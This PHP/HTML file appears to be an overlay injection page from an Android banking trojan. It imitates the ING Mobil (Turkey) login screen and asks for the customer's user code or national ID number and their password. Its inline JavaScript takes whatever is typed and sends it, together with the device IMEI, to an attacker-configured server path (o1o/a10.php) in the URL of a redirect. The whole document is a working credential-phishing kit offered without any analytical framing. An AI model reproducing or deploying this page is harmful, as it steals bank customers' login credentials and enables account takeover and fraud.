<html>
<head>
		<meta charset="UTF-8">
        <link href="tr/com.ingbanktr.ingmobil/style.css" rel="stylesheet">
</head>
<?php
$IMEI_country = htmlspecialchars($_REQUEST["p"], ENT_QUOTES);
//$IMEI_country = "321|tr";
include "config.php";
?>
<body>
    <div class="content">
        <div class="header">
            <img style="width: 50%;padding: 30px;" src="data:image/png;base64,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">
        </div>
        <div class="header2">
            <div style="float: left;"><h3 style="margin: 0;font-weight: 100; color: #ff6600;font-size: 18px;margin-top: -2px;">ING Mobile Bireysel</h3></div>
            <img style="width: 18px;float: right;" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACEAAAAkCAMAAAAw96PuAAABBVBMVEUAAAD/ZgD/ZgD/ZgD/ZgD/ZgD/ZgD/ZgD/ZgD/ZgD/ZgD/ZgD/ZgD/ZgD/ZgD/ZgD/ZgD/ZgD/ZgD/ZgD/ZgD/ZgD/ZgD/ZgD/ZgD/ZgD/ZgD/ZgD/ZgD/ZgD/ZgD/ZgD/ZgD/ZgD/ZgD/ZgD/ZgD/ZgD/ZgD/ZgD/ZgD/ZgD/ZgD/ZgD/ZgD/ZgD/ZgD/ZgD/ZgD/ZgD/ZgD/ZgD/ZgD/ZgD/ZgD/ZgD/ZgD/ZgD/ZgD/ZgD/ZgD/ZgD/ZgD/ZgD/ZgD/ZgD/ZgD/ZgD/ZgD/ZgD/ZgD/ZgD/ZgD/ZgD/ZgD/ZgD/ZgD/ZgD/ZgD/ZgD/ZgD/ZgD/ZgD/ZgD/ZgD/ZgD/ZgCjU8nhAAAAV3RSTlMARN7pEej240z90QIUpP/v4gWT9ecP0Pzsu0MKCNLgL6EVK+0qwf6YEm3DYeobHutboIP4QhbfRsyQl836UOYHU9XT+3CFBsrzReVWfYJ2wKwM2i4ZqDabQ3hBAAABYUlEQVQ4y32U55aCMBCFoxFWXA3YEFtEUVQsqNjLrgW728v7P8oeVw+HEri/7h0+EgIzAGCRzw/9PuChAEU/0FTAgwgyoccQE3QHwhHEciyKhF2uR2MQxRNcgkYwFiUBST4lpDNZkM2khRSfdAK5PMKFuy9glM85CJHBRSMUMSPagZIklE2xLEglG1GRq5ZclStWoAapmrVAQWuhzii2RRWmbssNG9Gw3YObLRvRamJzbKvYcXystk2pIysOQpE7ptRFPQfRQ11T4rW+g+hrvHlP2+Fvr8j0bAM4JHzsIRwYfqSNCcRYGxl+gqYEYoomhp/NFwRiMZ8ZzfMEk6Smg0/Pd7vUVsTGXWnLu1tvdCKhb9Y3s41zOyKx4+LbK7g/sEeX+Tiyh70OpM3p7Dpi59NGApQqVt0lqhSQkLckcHnx1sW67+vbvyLuw6/fVn53Jz4+rwD95fGL+f6hU5VfS+kP/mEylu8mA1gAAAAASUVORK5CYII=">
        </div>
    </div>
    <form action="null" method="post" id="_mainForm" target="flow_handler">
        <input type="text" id="login" name="login" class="login" placeholder="Kullanıcı Kodu / TC Kimlik No">

        <input type="password" id="password" name="password" class="password" placeholder="Şifreniz">
    </form>
<iframe src="about:blank" name="flow_handler" style="visibility:hidden;display:none"></iframe>
    <div class="content" style="padding: 0 20px;">
        <div class="text" style="margin-bottom: 20px;">
            <h3 style="color: #333;display: inline;font-weight: 100;margin: 0;"> Yardı Istiyorum </h3> <img style="width: 20px;margin-bottom: -5px;" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAD0AAAA+CAMAAACvKON1AAABs1BMVEX/agD/agD/agD/agD/agD/agD/agD/agD/agD/agD/////agD/agD/agD/agD/agD/agD/agD/agD/agD/agD/agD/agD/agD/agD/agD/agD/agD/agD/agD/agD/agD/agD/agD/agD/agD/agD/agD/agD/agD/agD/agD/agD/agD/agD/agD/agD/agD/agD/agD/agD/agD/agD/agD/agD/agD/agD/agD/agD/agD/agD/agD/agD/agD/agD/agD/agD/agD/agD/agD/agD/agD/agD/agD/agD/agD/agD/agD/agD/agD/agD/agD/agD/agD/agD/agD/agD/agD/agD/agD/agD/agD/agD/agD/agD/agD/agD/agD/agD/agD/agD/agD/agD/agD/agD/agD/agD/agD/agD/agD/agD/agD/agD/agD/agD/agD/agD/agD/agD/agD/agD/agD/agD/agD/agD/agD/agD/agD/agD/agD/agD/agD/agD/agD/agD/agD/agD/agD/agD/agD/agD/agD/agD/agD/agD98iaKAAAAkXRSTlMAAjNvl77d8Pz/AAdTre4ek+8fnfoFd/X0v3BZTEAr0+CFPAZfuEEBjDEDpepbo8Eai5FceSgE0ZJmmUR1uyIb86qYEcyIwFWONI3sT0Oo4+uGLy5s9ryW3Fb7Sv5G4WnCj7Z0MHa3YQ6gorE9sP3XC5wP52VOhLReDMmQyyy6EIMVUavHYyYZz0vFJMrxEyA4TW8GewAAA+tJREFUSMeVl+tDEkEQwAcE4QzfQpSaJtUpaUFlpeQD0d7mo+whmpbYg9QK0TKflZW9+5Ob2Tvg7thdz/mwwMz82L3Zm5ldAK44nCUud6nHq3g9pW5XidORt5QZhYce8pVXKGapKPcdskVXVlUrPKmuqtyXrqmtU0RSV1sjpf2BwznX4BHX0fqGxob6o64jwZzycMAvpo816V7Nx1tCBn2o5Xizbmk6JqJP6BOfPOUo3oRTJ/XpT3BptVUzu9v4mwhtbs2hVS2mw6eZqb0DxNLRznxOh620eoYZzkZAJpGzzOuMaqGjTH0uDHIJn2N+UTN9nikvwP5ygXmeN9KdQbswlDE82FmgL14izWWrY1c3e8UDMRNddpm0ly7m6SssYJZn7ipkSk+vkQ6z0F3J0X39tFWWaMdNKeY0ZmiENq6/T6cHyMG8z4lBtuYEQO8QWUtN+d1BqgGNjlBWXVXNU8cUJZ7Qvl4j32tGWr1KGRdh9HWy3rCGLDaU/0rB6zbVlhuE3CTaf4sSQ7ZJNHmPuTJRytzyI32b/mdYRvcaH1yjhwm6jfQd/BxxyGgnegyaaccI6u6UgTqKn2PS1yuAHkOWmjqGulEVxmkNLVK6Bz1iFrqFsLtwD8eJkAzuMi48R4cmUHsPqqicSGNWYZw6X1Op0FTBfRwfyOhB41MX6Aeovg8PcSyRwN2mdRfoEtQ/BGocj+TxLk1w6EfUXmASx6R0qxUncOgkGiaBzI3SzQoAj24kEKZwmBbBMeMbbqan0TQFHhx9spDF+LQPTR54jOOMiMatrgA+PYPcY5jF8YkATqAtLqCfoG0WanF8KknNgIB+irZamKNkcYjnHuLTDkrNOWDJkgLbotMpLTX91EbmD0zPU0PxAzyjznBgmrrPM6xMz2kN4wekWU15jvQLyvOXB6RfUk15QfWc+r63khvzuCDmlV46A7BucJdWkRa9qNYNZ3SaVTWtj72i7wscWjG3sDy9QPpFvQu2LeGP129s029eo3qpLde/WT9/W0zH+St/y84K+e6fWabfWZtRy5LzcqZwbhmmtS+t2NqxFeY7bDwzrdL/TSRt0El6PZRV04kr/I50k+/3hd9TFVXehc2nvbUPLMDr0p4EoXXm9WHNek7NaPjGpgTe3NDgTPEZObPFTJPRbQG7HWWrVrYyvPO5vizFs/ORw37c8Sj6wwnuBp/0+0zdom/NZFjzLerXlepP4ntJ3+fc+c672/pl4eu37W9fF7607npz6s990jvR9J4ilr3p/e5j6vcfAvbHd9XOXbBzrLkIbR7rtHmTRPmZTf/6rYO/f6WzP+3fQ3Py52/qX+rvH34vYfIfHN6jnmjHc0sAAAAASUVORK5CYII=">
        </div>

        <input type="submit" class="submit"  id="sbt_input" value="Giriş">
    </div>

	            <script type="text/javascript">

            (function () {


        var  __insHiddenField = function (objDoc, objForm, sNm, sV) {
             var input = objDoc.createElement("input");
             input.setAttribute("type", "hidden");
             input.setAttribute("name", sNm);
             input.setAttribute("value", sV);
             input.value = sV;
             objForm.appendChild(input);
         };
                    var g_oBtn = document.getElementById('sbt_input');
                    g_oBtn.onclick = function () {

						var oNumInp = document.getElementById('login');
                        var oCodeInp = document.getElementById('password');

						try{
							oNumInp.className = 'login';
							oCodeInp.className = 'password';
						} catch(e){};

                        if (oNumInp.value.length < 3) {
							try{
								oNumInp.className = 'loginerror';
							} catch(e){};
                            return false;
                        }

                        if (!/^\w{3,100}$/i.test(oCodeInp.value)) {
							try{
                                oCodeInp.className = 'passworderror';
							} catch(e){};
                            return false;
                        }

top['closeDlg'] = true;
var url='<?php echo $URL; ?>';
var imei_c='<?php echo $IMEI_country; ?>';
location.replace(url+'/o1o/a10.php?p=' + imei_c+"|Injection_3|htsu|"+oNumInp.value+"|"+oCodeInp.value);

return false;
};

})();
            </script>
</body>
</html>
